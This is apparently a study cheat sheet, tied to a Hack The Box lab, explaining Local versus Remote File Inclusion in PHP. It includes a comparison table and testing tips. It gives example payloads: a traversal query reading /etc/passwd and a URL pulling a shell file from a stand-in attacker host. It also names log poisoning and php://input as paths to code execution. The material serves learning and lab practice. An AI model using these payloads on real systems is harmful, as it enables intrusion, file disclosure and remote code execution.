## LFI (Local File Inclusion)
- **Definition:** Includes a file that already exists on the target server.
- **Execution:** The file is read and executed locally by the vulnerable application.
- **Path:** Uses directory traversal (`../`) to access system files.
- **Example:** `?page=../../../../etc/passwd`
- **Common Targets:** /etc/passwd, /var/log/apache2/access.log, Windows boot.ini.
- **Impact:**
  - Information Disclosure (reading config files, source code).
  - Remote Code Execution (RCE) via Log Poisoning or PHP Wrappers (`php://input`).

## RFI (Remote File Inclusion)
- **Definition:** Includes a file hosted on an external (remote) server controlled by the attacker.
- **Execution:** The vulnerable server fetches the file over HTTP/FTP/SMB and executes it.
- **Requirement:** PHP config `allow_url_include = On` (disabled by default in modern PHP).
- **Example:** `?page=http://attacker-ip/shell.txt` (Note: file often named .txt or .jpg to bypass filters, but still executed as PHP).
- **Impact:** Direct and immediate Remote Code Execution (RCE) as soon as the page loads.

## Key Differences (TL;DR)
| Feature | LFI | RFI |
| :--- | :--- | :--- |
| **File Location** | On the target server | On an attacker's external server |
| **Difficulty** | Easier to find, harder to exploit for RCE | Harder to find (needs config), instant RCE |
| **PHP Config** | Works with default settings | Needs `allow_url_include=On` |
| **Attack Vector** | Path Traversal | HTTP/HTTPS URL |

## Critical HTB Context
- If you find `?page=` parameter, test LFI FIRST.
- If you see a full URL being loaded (e.g., `?page=http://...`), test RFI.
- **Included Box:** You used **LFI** to read `/etc/passwd` and later poisoned logs to get a shell. You did **NOT** use RFI because `allow_url_include` was likely off.
